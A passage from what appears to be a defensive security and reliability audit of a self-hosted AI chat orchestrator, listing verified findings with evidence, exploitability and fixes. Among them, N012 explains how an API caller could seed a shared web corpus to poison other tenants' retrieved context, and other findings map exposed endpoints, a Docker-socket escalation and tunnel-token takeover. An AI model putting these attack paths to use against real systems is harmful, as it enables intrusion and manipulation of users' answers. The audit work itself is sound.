*Impact.* Quota enforcement and usage billing for the developer API will read usage_events by workspace_id. With no FK, a typo'd or stale workspace id writes a row that is simply invisible to every report, a deleted workspace leaves orphaned usage that no cascade or SET NULL ever reaches, and nothing at the database level prevents a future code path from writing an attacker-influenced string into the column. The analytics console already aggregates `WHERE workspace_id = %s` (analytics/__init__.py:99-101) and would silently under-report.

*Verification.* The schema facts are right: usage_events.workspace_id is `text,` with no REFERENCES (db.py:967), query_traces.workspace_id likewise (db.py:1610), conversation_shares.workspace_id is `text NOT NULL` with no REFERENCES (db.py:1071), while workspace_memberships (db.py:636), workspace_invitations (db.py:672) and audit_events (db.py:693) all reference workspaces. analytics/__init__.py:99-101 does aggregate `WHERE workspace_id = %s`. Two of the three stated impacts do not exist, though: there is no workspace-deletion path anywhere in the tree (`grep 'DELETE FROM workspaces' / 'def delete_workspace'` → nothing), so no orphaning can occur; and workspace_id is never client-supplied — it is stamped from the Principal (principal.py:69-89) and written as `workspace_id or None` (usage.py:57,94). This is schema hygiene that becomes load-bearing when a second workspace exists, not a defect producing wrong numbers today.

*Exploitable today.* No. Not an attacker-reachable column; no code path lets a client influence workspace_id, and no deletion path can orphan rows.

*Fix.* In V34, additively: `ALTER TABLE usage_events ADD CONSTRAINT usage_events_workspace_fkey FOREIGN KEY (workspace_id) REFERENCES workspaces(id) ON DELETE SET NULL NOT VALID;` then a separate `VALIDATE CONSTRAINT`, same for query_traces; conversation_shares is NOT NULL so it needs ON DELETE CASCADE.

*Fix risk.* The VALIDATE scan is exactly what F038's 15 s statement_timeout aborts — use NOT VALID + a separate validation run out-of-band, not inside init_schema. Orchestrator restart for the migration; no model restart. Do it in a quiet window if usage_events has grown.

### F037 — One-membership-per-user resolution blocks a multi-tenant API: Principal silently picks the oldest workspace

**P2** · database · `orchestrator/app/authn/store.py:114` · verdict **ADJUSTED** · claimed P1

*Evidence.* `def membership(user_id: int)` runs `SELECT m.workspace_id, m.user_id, m.role, … FROM workspace_memberships m JOIN workspaces w ON w.id = m.workspace_id WHERE m.user_id = %s ORDER BY w.created_at, w.id LIMIT 1` (store.py:114-127) — the schema's `PRIMARY KEY (workspace_id, user_id)` (db.py:650) permits many memberships per user, and this silently takes one. `default_workspace()` does the same for the workspace itself: `SELECT * FROM workspaces ORDER BY created_at, id LIMIT 1` with the comment 'The workspace. The data model supports many; the deployment runs one' (store.py:92-99). `principal._build` consumes that single row and stamps `workspace_id=member["workspace_id"]` onto the Principal (principal.py:69-89), and every admin and analytics route then scopes off `principal.workspace_id` (admin_api.py:93, 119, 177, 649; analytics_api.py:203, 334, 361).

*Impact.* An API key issued for workspace W cannot be honoured: the Principal that authorises the call resolves to whichever workspace is oldest, so quota, feature gating, analytics attribution and the audit trail would all be written against the wrong tenant the moment a second workspace exists. A silent `LIMIT 1` is also the worst failure shape — no error, just wrong-tenant data.

*Verification.* The code reads as quoted: store.py:114-127 `... WHERE m.user_id = %s ORDER BY w.created_at, w.id LIMIT 1`, store.py:92-99 default_workspace() the same, principal.py:69-89 stamps workspace_id onto the Principal, and the admin/analytics routes scope off it. But the ambiguity cannot arise today: the ONLY writer of workspaces is store.ensure_workspace (store.py:101-111), which returns the existing row before inserting, and its only callers are authn/bootstrap.py:42,81, tests/conftest.py:320 and scripts/e2e-stack.sh:156 — there is no route, admin action or script that creates a second workspace. So `LIMIT 1` over a one-row table is deterministic and correct, and the workspace_memberships PK (db.py:650) permitting many rows is latent capacity, not live risk. The finding is a correct forward-looking design constraint on the developer platform, mis-rated as a present P1 defect.

*Exploitable today.* No. A second workspace cannot be created through any code path in the repository, so no Principal can resolve to the wrong tenant.

*Fix.* Do not change membership() for the browser. For the API, put workspace_id on the api_keys row and resolve the Principal from (key → user_id, workspace_id) with an explicit `SELECT role FROM workspace_memberships WHERE user_id = %s AND workspace_id = %s` existence check; add `membership_for(user_id, workspace_id)` beside the current function and make the singleton path log loudly when `count(*) > 1`.

*Fix risk.* New code paths only; nothing existing changes shape. Orchestrator restart when the API ships; no model restart.

### F038 — Migration DDL runs under a 15 s statement_timeout inside one all-or-nothing transaction, so a V34 index build on a large table aborts the whole deploy

**P2** · database · `orchestrator/app/db.py:2092` · verdict **CONFIRMED** · blocks release

*Evidence.* `init_schema()` takes an ordinary pooled connection (`with connection() as con:`, db.py:2091), and every pooled connection is opened with `options=_server_options()` = `"-c timezone=UTC" f" -c statement_timeout={int(settings.app_db_statement_timeout_ms)}" " -c idle_in_transaction_session_timeout=60000"` (db.py:1897-1913, applied at db.py:1959-1963). `APP_DB_STATEMENT_TIMEOUT_MS` defaults to 15_000 (config.py:1239). All pending migrations then run inside a single `with con.transaction():` (db.py:2092-2105), so a timeout in V34 rolls back every other unapplied migration in the same batch as well. There is no CONCURRENTLY escape hatch: `CREATE INDEX CONCURRENTLY` cannot run inside a transaction block, and every existing index in the file is a plain `CREATE INDEX IF NOT EXISTS`. V32 already shows the shape that would bite hardest — a full-table backfill UPDATE followed by two `ALTER COLUMN … SET NOT NULL` validation scans (db.py:1799-1810) — and usage_events/query_trace_events are exactly the tables a public API makes large.

*Impact.* The first V34 that adds an index or a validated constraint to usage_events, messages or query_trace_events on a grown production database will abort `init_schema`, fail the FastAPI lifespan, and take the orchestrator container into a restart loop — with none of the batch's migrations applied. It fails in production only: CI's schema job runs against empty databases (.github/workflows/pipeline.yml:388-399), so the timeout is invisible there.

*Verification.* init_schema (db.py:2080-2105) opens `with connection() as con:` — the shared request pool (db.py:1986-1995 → pool() at db.py:1931-1965) — whose kwargs set `options=_server_options()`, i.e. `-c statement_timeout={settings.app_db_statement_timeout_ms}` (db.py:1897-1913), defaulting to 15_000 (config.py:1239). Every unapplied migration then runs inside the single `with con.transaction():` under pg_advisory_xact_lock, so one timed-out statement rolls back the whole batch. CREATE INDEX CONCURRENTLY is impossible there, and every index in the file is a plain CREATE INDEX IF NOT EXISTS. The lifespan calls it with no try/except (main.py:72), so the failure kills startup and the container restart-loops. V32 (db.py:1799-1810) already ships the dangerous shape — a full-table UPDATE on query_trace_events followed by two ALTER COLUMN ... SET NOT NULL validation scans. CI cannot see it: the schema job runs against empty databases.

*Exploitable today.* Not attacker-reachable — this is an availability/deploy hazard, not a security one. It bites the first time a V34 statement takes >15 s on the grown production tables (usage_events, query_trace_events, messages, chat_requests).

*Fix.* Give init_schema its own connection instead of borrowing the request pool: `psycopg.connect(dsn(), options="-c timezone=UTC -c statement_timeout=0", row_factory=dict_row, autocommit=False)` at db.py:2090, keeping the advisory lock and the transaction. Alternative, if that change is unwanted: keep V34 to CREATE TABLE/INDEX on new empty tables and run anything touching an existing large table out-of-band via scripts/deploy-db-rehearsal.sh.

*Fix risk.* Removing the bound means a pathological migration can hang startup instead of failing it — acceptable because the advisory lock already serialises and the readiness probe will show it. Rehearse V34 with `scripts/deploy-db-rehearsal.sh --provision` against a seeded copy first. Orchestrator restart only; no model restart, but schedule the V34 deploy in a window since a failure is a restart loop.

### F039 — V29 and V30 do not index the user_id foreign keys their cascades walk, against the rule V31 states explicitly

**P2** · database · `orchestrator/app/db.py:1590` · verdict **ADJUSTED**

*Evidence.* chat_requests declares `user_id integer NOT NULL REFERENCES users(id) ON DELETE CASCADE` (db.py:1576) but its only indexes are `idx_chat_requests_conv (conversation_id, created_at DESC)` (db.py:1590-1591) and the partial `idx_chat_requests_open (status)` (db.py:1592-1593, replaced by db.py:1828-1829). upload_sessions likewise has `user_id … ON DELETE CASCADE` (db.py:1548) with only `idx_upload_sessions_conv` and `idx_upload_sessions_open` (db.py:1567-1571). query_traces has `user_id integer REFERENCES users(id) ON DELETE SET NULL` (db.py:1609) with only conversation and workspace indexes (db.py:1628-1632). video_attachments has `user_id integer REFERENCES users(id) ON DELETE CASCADE` (db.py:1507) with only conversation and analysis indexes (db.py:1513-1516). V31 states the rule these three break: 'The FKs the cascade walks and the join the API makes …, indexed as V29 indexes every FK it cascades through: a user deletion is users -> artifacts -> artifact_jobs, and without these each artifact costs a sequential scan' (db.py:1770-1773).

*Impact.* Deleting a user sequentially scans four tables, one of which (chat_requests) grows one row per API request — inside the 15 s statement timeout, so account deletion will eventually fail outright. It also makes the obvious developer-console queries ('my recent requests', 'my traces') seq-scan, which is the first page the /api console will need.

*Verification.* The index inventory is correct — `grep 'CREATE INDEX' db.py` on these four tables yields only idx_chat_requests_conv/_open (db.py:1590-1593, 1828-1829), idx_upload_sessions_conv/_open (db.py:1569-1571), idx_query_traces_conversation/_workspace/_test_case (db.py:1626-1628, 1792) and idx_video_attachments_conv/_analysis (db.py:1513-1516); none on user_id, while V31 states the opposite rule at db.py:1770-1773. The headline impact is unreachable, though: there is no account-deletion path in the tree at all — `grep 'DELETE FROM users'` and `grep 'def delete_user\|delete_account'` return nothing but delete_user_fact (db.py:4880) — so no cascade walks these FKs today. The only current per-user read is db.py:6127 `WHERE trace_id = %s AND user_id = %s`, which hits the query_traces primary key. So this is pre-work for the developer console's "my recent requests" page, not a present risk.

*Exploitable today.* No. Not attacker-reachable, and the stated failure (account deletion timing out) cannot happen because account deletion does not exist.

*Fix.* In V34, additively: `CREATE INDEX IF NOT EXISTS idx_chat_requests_user ON chat_requests (user_id, created_at DESC);` and the equivalents for upload_sessions, query_traces (user_id, started_at DESC) and video_attachments (user_id, id).

*Fix risk.* Index builds on chat_requests/query_traces are exactly what F038's 15 s timeout aborts — build them CONCURRENTLY out-of-band, not inside init_schema. No model restart; orchestrator restart only if shipped as a migration.

### F040 — No retention or pruning exists for the four append-only tables a public API will grow fastest

**P2** · database · `orchestrator/app/db.py:959` · verdict **CONFIRMED**

*Evidence.* usage_events (db.py:959), query_traces / query_trace_events (db.py:1606, 1631), audit_events (db.py:692, documented 'Append-only by convention: nothing in the application updates or deletes rows') and chat_requests (db.py:1574) are written on every turn and never deleted: grep for `DELETE FROM usage_events|DELETE FROM query_traces|DELETE FROM audit_events` across orchestrator/app returns nothing. The only pruning that exists anywhere is for sessions — `prune_expired_sessions(older_than_days: int = 30)` (authn/store.py:554-566), called once from the lifespan (main.py:80-82). chat_requests rows additionally carry the full request snapshot as `request jsonb NOT NULL` (db.py:1583), so each row is kilobytes, not bytes.

*Impact.* A public API multiplies these four tables by its request volume with no ceiling. The analytics console's design note explicitly assumes 'thousands of messages, tens of thousands of usage events' and says 'the moment a query here stops being fast the fix is a rollup table' (analytics/__init__.py:5-9) — that moment arrives with the API. Unbounded growth also lengthens exactly the ALTER/CREATE INDEX operations that the 15 s statement timeout will refuse.

*Verification.* `grep 'DELETE FROM usage_events\|DELETE FROM query_traces\|DELETE FROM audit_events\|DELETE FROM chat_requests' orchestrator/app` returns nothing. The only pruning in the process is prune_expired_sessions (authn/store.py:554-566) called once from the lifespan (main.py:82). chat_requests does carry `request jsonb NOT NULL` (db.py:1583) so rows are kilobytes; it is cleared only as a _SIDE_TABLES entry when its conversation is deleted (db.py:2386), which never happens for the bare `u<id>-<session>` keys. One correction in the app's favour: the jsonb snapshot is NOT a base64 blob — _request_snapshot (main.py:1119-1132) pops _INLINE_BYTE_FIELDS, so images and inline PDFs are stripped, and the growth is linear in request count rather than in upload size. analytics/__init__.py:1-9 does say a rollup is the fix once these stop being fast.

*Exploitable today.* Not an exploit; an unbounded-growth hazard that a public API multiplies by its request volume. It also lengthens precisely the DDL that F038's timeout refuses.

*Fix.* Ship a retention sweep with the platform: `prune_usage_events(older_than_days)` / `prune_query_traces(older_than_days)` modelled on prune_expired_sessions, plus a delete of finished chat_requests (`status IN ('completed','failed','cancelled') AND finished_at < now() - interval`), wired into the lifespan hook beside main.py:82 with the window as a setting. Leave audit_events alone without an explicit retention decision — it is the security trail.

*Fix risk.* A first sweep over a large table must be batched (LIMIT + loop) or it will hit the 15 s statement_timeout on a request-pool connection and log an error every start. Orchestrator restart; no model restart.

### F041 — Test isolation depends on a hand-maintained table list, so a V34 table leaks state between tests until someone remembers it

**P2** · database · `orchestrator/tests/conftest.py:65` · verdict **ADJUSTED**

*Evidence.* `_APP_TABLES = (…)` (conftest.py:65-128) is a literal tuple of 44 table names, used by the autouse fixture as `con.execute(f"TRUNCATE TABLE {', '.join(_APP_TABLES)} RESTART IDENTITY CASCADE")` (conftest.py:288-290). Nothing derives it from the schema, and nothing fails when a table is missing from it — the comments record that this has already been a live problem three times (research_runs 'would survive every other truncation', video_attachments 'a NULL-user row … would survive', web_crawl_frontier likewise, conftest.py:71-95). Only one table has a test proving it is reachable by the truncation (test_crawl_durability.py:908 `test_the_frontier_table_is_reachable_by_the_suites_truncation`).

*Impact.* A V34 api_keys / api_requests / webhook_deliveries table not added to `_APP_TABLES` keeps rows across tests. The symptom is order-dependent flakiness in unrelated suites — the most expensive kind of false alarm, as the fixture's own comment about the shared LanceDB directory says (conftest.py:277-283).

*Verification.* _APP_TABLES is a literal 44-name tuple (conftest.py:65-128) fed to `TRUNCATE TABLE {', '.join(_APP_TABLES)} RESTART IDENTITY CASCADE` (conftest.py:288-290), derived from nothing, and the comments do record three past misses. But the leak is narrower than stated because of CASCADE. I diffed the schema against the list: the tables currently missing are usage_events, user_facts, message_embeddings and voice_transcriptions (plus schema_migrations, deliberately). All four carry a FK to users (db.py: usage_events user_id REFERENCES users; user_facts NOT NULL REFERENCES users; message_embeddings REFERENCES messages and users; voice_transcriptions REFERENCES users), and `users` is in the truncation list, so TRUNCATE ... CASCADE empties them anyway — there is no live leak today. The real exposure is a future table with NO foreign key into a truncated parent (a webhook_deliveries or api_requests keyed only by api_key_id would qualify). I also confirmed the destructive fixture is well guarded against production: _assert_safe_test_dsn (conftest.py:135-155) is a positive test-name check, re-asserted immediately before the TRUNCATE (conftest.py:272).

*Exploitable today.* No. Not attacker-reachable; a test-hygiene risk, and currently dormant because CASCADE reaches all four unlisted tables.

*Fix.* Add the guard the finding proposes, which is the part that actually pays: a test asserting `set(information_schema.tables WHERE table_schema='public') == set(_APP_TABLES) | {'schema_migrations', ...}`, so the next unlisted table is a red test rather than order-dependent flakiness. Adding the four current tables to _APP_TABLES is optional tidiness.

*Fix risk.* Test-only; touches nothing that runs in production. No restart of any kind.

### N011 — chat_requests.intent_id is one global primary-key namespace across all users, so a client-chosen idempotency key can be squatted cross-tenant

**P2** · database · `orchestrator/app/db.py:1575` · verdict **FOUND IN VERIFICATION**

*Evidence.* `CREATE TABLE IF NOT EXISTS chat_requests (intent_id text PRIMARY KEY, user_id integer NOT NULL REFERENCES users(id) ...)` (db.py:1574-1576) — uniqueness is global, not per user. create_chat_request inserts `ON CONFLICT (intent_id) DO NOTHING` and returns None on collision (db.py, create_chat_request), and /chat then reads the row and, because `int(known["user_id"]) != viewer`, raises a permanent `409 intent_id belongs to another conversation` (main.py:1791-1804). The row is never deleted except as a _SIDE_TABLES entry when its conversation is deleted (db.py:2386), which never happens for keys with no conversations row. intent_id is fully client-supplied and validated only for shape: `_INTENT_ID_RE = ^[A-Za-z0-9_-]{1,64}$` (main.py:214, validator at main.py:710-715).

*Impact.* Harmless today because the browser mints uuid4 hex (unguessable), but a developer platform's idempotency keys are conventionally human-chosen and low-entropy (`order-42`, `retry-3`). On this schema, tenant A sending `intent_id="order-42"` permanently poisons that key for every other tenant: tenant B's request is refused 409 forever, with no way to clear it. It is also an information oracle in reverse — the 409 is the same whether the id is yours-elsewhere or someone else's, which is correct, but the denial is permanent either way.

*Fix.* Scope the idempotency key to its owner before the API ships: make the primary key `(user_id, intent_id)` — or, for API traffic, `(api_key_id, intent_id)` — in the V34 migration, and change create_chat_request/get_chat_request/set_chat_request_status to take user_id alongside intent_id. It is a primary-key change on a live table, so it belongs in the same out-of-band operator window as F038's index work, not inside init_schema. Orchestrator restart; no model restart.

### N012 — web_pages is a single global corpus with no tenant predicate on retrieval — one API caller can poison every other tenant's retrieved context

**P2** · database · `orchestrator/app/web_memory.py:1152` · verdict **FOUND IN VERIFICATION**

*Evidence.* The lexical candidate query selects `FROM web_pages WHERE search_tsv @@ websearch_to_tsquery('english', %s) AND text <> '' AND quarantined_at IS NULL` (web_memory.py:1144-1156) — no user_id, no workspace_id, no conversation predicate. The table itself has no owner column at all (db.py, CREATE TABLE web_pages: url_key/url/title/text/... only), and db.py:2356-2394 documents the intent: web_pages is "GLOBAL shared content and is never deleted with a conversation". Pages enter it from any user's URL paste or crawl (main.py:3138 run_url_engine, main.py:3115 run_crawl_engine); the introducer is recorded for attribution only (`user_id=viewer` at main.py:3145, "attributable, purgeable"), and quarantined_at is the sole exclusion.

*Impact.* Today the content is public web text and the sharing is a deliberate V16 design. Once a public developer API exists, any API key becomes a write handle into the corpus that answers other tenants' questions: seed pages whose text is dense in a target's query terms and they become candidates in that target's answer, cited as a source. Attribution exists but there is no isolation and no automatic exclusion — the only control is a manual quarantine after the fact.

*Fix.* Before the API opens, add a trust dimension rather than a full tenant split (which would lose the corpus's value): an `origin`/`trust` predicate on the retrieval query at web_memory.py:1152 so pages introduced by API-key traffic are candidates only for the workspace that introduced them, until promoted. Schema-wise that is an additive column plus one WHERE clause. Orchestrator restart; no model restart. Do not attempt a retroactive split of the existing corpus in the same change.

### F053 — The orchestrator publishes on 0.0.0.0:8080 and serves FastAPI's /docs, /redoc and /openapi.json unauthenticated

**P2** · edge-devops · `orchestrator/app/main.py:219` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* orchestrator/app/main.py:219 `app = FastAPI(title="TechSara Orchestrator", version="0.2.0", lifespan=lifespan)` — no `docs_url=None`, no `redoc_url=None`, no `openapi_url=None`, so the defaults are served. compose.yaml:233 publishes the service at `"${TECHSARA_BIND_ADDRESS:-127.0.0.1}:${ORCHESTRATOR_PORT:-8080}:8080"`, and .env:72 sets that to 0.0.0.0; `docker inspect sf-local-ai-orchestrator-1` confirms `{"8080/tcp":[{"HostIp":"0.0.0.0","HostPort":"8080"}]}`. From the LAN address: /openapi.json returns 200 with 94 paths (including every /admin/api/* route), /docs returns 200, /metrics returns 200 with 17,331 bytes of Prometheus text, while /chat and /auth/me correctly return 401.

*Impact.* Every internal route, request schema and admin endpoint of the private API is published to the office LAN and the tailnet, along with live operational metrics (chat_request_attempts_total and friends) and a /health body that names internal hosts and circuit-breaker state. The route gating itself holds — /chat and /auth/me are 401 — so this is disclosure, not bypass, but it hands an attacker the complete map of /admin/api/members/{user_id}/reset-password, /admin/api/analytics/export, /public/shares/{token} and the rest before they start. It becomes far worse the moment api.techsarasolutions.com is pointed at this container: /docs and /openapi.json would then be on the public internet, and the developer platform's own /docs would be shadowed by Swagger UI.

*Verification.* Facts all hold. orchestrator/app/main.py:219 is exactly `app = FastAPI(title="TechSara Orchestrator", version="0.2.0", lifespan=lifespan)` and a repo-wide grep for docs_url/redoc_url/openapi_url under orchestrator/app/ returns ZERO hits, so the defaults are live. compose.yaml:233 is `"${TECHSARA_BIND_ADDRESS:-127.0.0.1}:${ORCHESTRATOR_PORT:-8080}:8080"` and .env:72 makes it 0.0.0.0; docker ps shows `0.0.0.0:8080->8080/tcp`. My own probes from 192.168.9.54: /openapi.json 200 with exactly 94 paths, /docs 200, /metrics 200, /auth/me 401. The route map really does include /admin/api/members/{user_id}/reset-password, /admin/api/analytics/export and /public/shares/{token}. Downgrading from P1 to P2 because the auditor's own caveat is the decisive one: this is disclosure, not bypass — the gating holds — and I checked the /metrics body for the obvious escalation and found none: the series are operational only (chat_request_attempts_total, chat_ttft_seconds_*, embed_*, knowledge_*) and grep for '@', 'email', 'user_id', 'conversation' in the metrics text returns nothing, so no PII or identifiers leak. The developer-platform half of their impact statement is correct and is the reason this still has to be fixed.

*Exploitable today.* Yes for the disclosure, from LAN/tailnet position only, no credential. Not from the internet today.

*Fix.* At orchestrator/app/main.py:219 pass `docs_url=None, redoc_url=None, openapi_url=None` and re-enable them behind an explicit dev flag. Separately drop compose.yaml:233 to `${TECHSARA_MODEL_BIND_ADDRESS:-127.0.0.1}` or remove the mapping entirely — the frontend dials `http://orchestrator:8080` over the `application` network (frontend/lib/proxy.ts:10 ORCHESTRATOR_URL), so nothing in the app needs the host port.

*Fix risk.* Orchestrator container restart only; no model restart, no production window. Two things break if you remove the host port without checking: any operator script or e2e harness that curls 127.0.0.1:8080, and Prometheus if it is scraping the published port rather than the service name — check monitoring/prometheus/prometheus.yml before removing rather than before rebinding.

### F054 — The orchestrator container carries every secret in the project, including the Cloudflare tunnel bearer token

**P2** · edge-devops · `compose.yaml:157` · verdict **ADJUSTED** · claimed P1

*Evidence.* compose.yaml:6-12 defines `x-runtime-env` as the three files .env, .runtime/secrets.env and .runtime/generated.env, and compose.yaml:157 attaches all three to the orchestrator with `env_file: *runtime-env`. `docker inspect sf-local-ai-orchestrator-1 --format '{{range .Config.Env}}{{println .}}{{end}}'` (values masked) shows the container holds CLOUDFLARE_TUNNEL_TOKEN, CLOUDFLARE_TUNNEL_TOKEN_GRAFANA, GRAFANA_ADMIN_PASSWORD, PGADMIN_DEFAULT_PASSWORD, HF_TOKEN, SEARXNG_SECRET, SF_CLIENT_SECRET, POSTGRES_PASSWORD, SESSION_SECRET, TAVILY_API_KEY, BRAVE_API_KEY and TECHSARA_MODEL_API_KEY. The file itself shows the authors already know this is the risk: compose.yaml:214-222 blanks CLUSTER_SENTINEL_TOKEN specifically because "`env_file` above feeds `.env` to this service wholesale" and that token "authorises POST /restart" and must stay "out of the process that handles untrusted input".

*Impact.* The orchestrator is the process that handles untrusted input — prompts, uploads, fetched web pages, OCR'd documents. Any path that echoes or logs the environment (a traceback with locals, a debug endpoint, an SSRF that reaches a metadata-style reflector, a dependency that dumps env on crash) leaks the Cloudflare tunnel bearer credential. Whoever holds that token can register connections for tunnel 1ab174c1 and serve traffic on ai.techsarasolutions.com themselves — a complete takeover of the public hostname, including harvesting employee logins. GRAFANA_ADMIN_PASSWORD and PGADMIN_DEFAULT_PASSWORD are the same shape of problem with a smaller radius. None of these six keys is read by any orchestrator code.

*Verification.* The inventory is accurate — I re-ran the inspect and the orchestrator's env really does contain CLOUDFLARE_TUNNEL_TOKEN, CLOUDFLARE_TUNNEL_TOKEN_GRAFANA, GRAFANA_ADMIN_PASSWORD, PGADMIN_DEFAULT_PASSWORD, HF_TOKEN and SEARXNG_SECRET, and a grep of orchestrator/app/ for any of those names returns zero hits, so none is read by the code. compose.yaml:6-12 and :157 are as quoted, and the CLUSTER_SENTINEL_TOKEN precedent at :214-222 is real AND verified working: the running container's CLUSTER_SENTINEL_TOKEN has length 0. Downgraded from P1 because there is no disclosure path today, and I went looking: the only env-wide read in the codebase is orchestrator/app/core/repo.py:446 `env = dict(os.environ)` (a subprocess environment, not a response), there is no debug/env route, and the SSRF class their impact statement leans on is already closed — orchestrator/app/core/net.py:147-198 blocks private/loopback/link-local/reserved addresses with DNS pinning against rebinding. So this is secret sprawl and blast-radius hygiene, exploitable only in combination with a separate, currently-unfound bug.

*Exploitable today.* No. It needs a second vulnerability (an env-dumping traceback, a debug route, or a crash handler that serialises the environment) before any of these keys leaves the container.

*Fix.* Extend the existing pattern at compose.yaml:222: add explicit blank overrides in the orchestrator's `environment:` block for CLOUDFLARE_TUNNEL_TOKEN, CLOUDFLARE_TUNNEL_TOKEN_GRAFANA, GRAFANA_ADMIN_PASSWORD, PGADMIN_DEFAULT_PASSWORD and SEARXNG_SECRET (`environment:` overrides `env_file:`, which is why the sentinel blanking works), and do the same for frontend and sync-worker.

*Fix risk.* Low but not zero: `environment:` blanks are absolute, so if any of those keys is later needed by the orchestrator it silently becomes empty rather than missing. Orchestrator/frontend/sync-worker container restart; no model restart, no production window. Do this before the developer platform adds webhook signing keys, so the allow-list shape is in place first.

### F055 — The engine controller's state and metrics API is on 0.0.0.0:9838 with no authentication

**P2** · edge-devops · `monitoring/engine-controller/controller.py:356` · verdict **ADJUSTED** · claimed P1

*Evidence.* monitoring/engine-controller/controller.py:290 `bind: str = "0.0.0.0"` and :356 `bind=env_str("CONTROLLER_BIND", "0.0.0.0")`; compose/compose.dgx-spark.yaml sets only `CONTROLLER_PORT: "9838"` at :210 and never sets CONTROLLER_BIND, while :156 is `network_mode: host` — so the default 0.0.0.0 reaches the host directly. `ss -ltn` confirms `LISTEN 0 4096 0.0.0.0:9838`. do_GET at controller.py:3196-3208 serves /state, /metrics and /healthz with no auth check at all. The destructive path IS correctly protected: do_POST at :3210-3235 refuses anything but /recover and gates it on `is_loopback(peer)` at :3222-3229.

*Impact.* Any LAN or tailnet host can read the full internal state of the inference cluster: incident ids, recovery step, breaker states, readiness detail, both nodes' health, request queue depths, and whatever the controller's Prometheus text exposes. That is a precise, free reconnaissance and timing oracle for an attacker who wants to hit the engine while it is mid-recovery, and it discloses operational detail about a service whose whole purpose is to survive faults. The container also holds /var/run/docker.sock read-write (compose/compose.dgx-spark.yaml:159), so any future mutating route added to this handler without a loopback check is host root from the LAN.

*Verification.* Every cited line is correct. monitoring/engine-controller/controller.py:290 `bind: str = "0.0.0.0"`, :356 `bind=env_str("CONTROLLER_BIND", "0.0.0.0")`; compose/compose.dgx-spark.yaml:156 `network_mode: host`, :210 `CONTROLLER_PORT: "9838"` with no CONTROLLER_BIND anywhere; :159 mounts /var/run/docker.sock read-write. do_GET at :3196-3208 serves /state, /metrics and /healthz with no check. ss shows `LISTEN 0 5 0.0.0.0:9838` and GET http://192.168.9.54:9838/state -> 200 from the LAN. The auditor is scrupulous about the mitigation and it is real: do_POST at :3210-3235 returns 404 for any path but /recover and 403 via `is_loopback(peer)` BEFORE reading the body. Downgraded to P2 because I read the actual /state and /metrics bodies: they contain incident ids, readiness proofs, probe timings, breaker and recovery state — operational detail, no credentials, no SENTINEL_URL token, nothing that grants access. It is a timing oracle, not a key.

*Exploitable today.* Yes for read-only reconnaissance, from LAN/tailnet position, no credential. The mutating path is not exploitable off-loopback.

*Fix.* Add `CONTROLLER_BIND: ${CONTROLLER_BIND:-172.17.0.1}` to the engine-controller `environment:` block at compose/compose.dgx-spark.yaml:210, and flip the default at controller.py:356 to 127.0.0.1 so a missing variable fails closed. The bridge gateway (not loopback) is required because Prometheus runs on a bridge network and reaches it through host.docker.internal — the same reason compose/compose.monitoring.yaml:136-139 gives.

*Fix risk.* Recreates the engine-controller container only. The model pair is NOT restarted — but note the controller is the recovery authority for the engine, so do it during a quiet period and confirm it comes back green (scripts/cluster-verify-engine.sh) before walking away. Its HEAD_API_URL is 127.0.0.1:8000 on host network and is unaffected. Check the Prometheus scrape target for 9838 matches the new bind before applying.

### F056 — node_exporter publishes full host telemetry on 0.0.0.0:9100 with no firewall behind it

**P2** · edge-devops · `compose/compose.monitoring.yaml:140` · verdict **ADJUSTED** · claimed P1

*Evidence.* compose/compose.monitoring.yaml:140 `- --web.listen-address=${MONITORING_NODE_BIND:-0.0.0.0}:9100` with `network_mode: host` at :155 and `pid: host` at :156, mounting `/:/host:ro,rslave`. MONITORING_NODE_BIND is not set in .env (only MONITORING_BIND_ADDRESS=127.0.0.1 at .env:296, which governs Prometheus and Grafana, not this), so the 0.0.0.0 default applies. `ss -ltn` shows `*:9100`. The file's own comment at :137-139 says MONITORING_NODE_BIND exists "where a firewall is not available (ufw is off on both nodes)" — and it was not used.

*Impact.* Any LAN or tailnet host can read filesystem usage and mount points, every network interface including the RoCE rails, process and boot counters, systemd unit states, and the InfiniBand counters — a complete inventory of the machine that is about to host a public developer API, free and unauthenticated. It is the reconnaissance layer that makes the other findings on this list easy to exploit in the right order, and with `pid: host` and `/:/host:ro` the container itself is an unusually good pivot target.

*Verification.* Confirmed exactly as written. compose/compose.monitoring.yaml:140 is `- --web.listen-address=${MONITORING_NODE_BIND:-0.0.0.0}:9100`, :155 `network_mode: host`, :156 `pid: host`, with `/:/host:ro,rslave`. A grep of .env for MONITORING_NODE_BIND returns nothing (only MONITORING_BIND_ADDRESS=127.0.0.1 at :296, which governs Prometheus/Grafana — both confirmed on 127.0.0.1 in docker ps), so the 0.0.0.0 default applies. ss shows `*:9100` and GET http://192.168.9.54:9100/metrics -> 200. The file's own comment at :137-139 does name the variable as the mitigation for a host with ufw off, and it was not used — a genuine self-documented miss. P2 rather than P1: this is read-only host inventory with no credential and no write path; it makes other attacks easier to sequence but grants nothing by itself.

*Exploitable today.* Yes, read-only, from LAN/tailnet position, no credential.

*Fix.* Set `MONITORING_NODE_BIND=172.17.0.1` in .env (the docker bridge gateway Prometheus already dials through host.docker.internal — the same value compose/compose.whisper.yaml uses for the head's whisper). Apply the same on the worker's monitoring overlay. Loopback will not work; compose/compose.monitoring.yaml:136-137 explains why.

*Fix risk.* node-exporter container restart only; no model restart, no production window. The one real risk is silently blinding the dashboards: after the restart confirm the Prometheus `node` target is still UP, because a wrong gateway address leaves the exporter healthy and the scrape failing.

### F057 — cadvisor receives the Docker socket through a read-only bind of /var/run, which does not make the Docker API read-only

**P2** · edge-devops · `compose/compose.monitoring.yaml:222` · verdict **ADJUSTED** · claimed P1

*Evidence.* compose/compose.monitoring.yaml:220-225 mounts `- /var/run:/var/run:ro` alongside `/:/rootfs:ro` and `/var/lib/docker:/var/lib/docker:ro`, with `privileged: false` at :219. /var/run/docker.sock exists and is `srw-rw---- 1 root docker` (verified with ls -la). `docker inspect sf-local-ai-cadvisor-1` confirms `Binds=["/var/run:/var/run:ro", ...]` and that it sits on the `application` network with the orchestrator.

*Impact.* A `ro` bind mount makes the directory entry unwritable; it does not make a unix socket read-only. A process inside cadvisor that can open /var/run/docker.sock can issue any Docker API call — create a privileged container, mount the host root, read the pgdata volume. cadvisor does not need write access to run: it needs the socket only for container metadata. So this is a needlessly root-equivalent mount on a container that parses untrusted-ish input (container labels, cgroup data) and is reachable from the same Docker network as the orchestrator. The engine-controller has the same mount deliberately and documents why (it restarts the engine); cadvisor has no such justification.

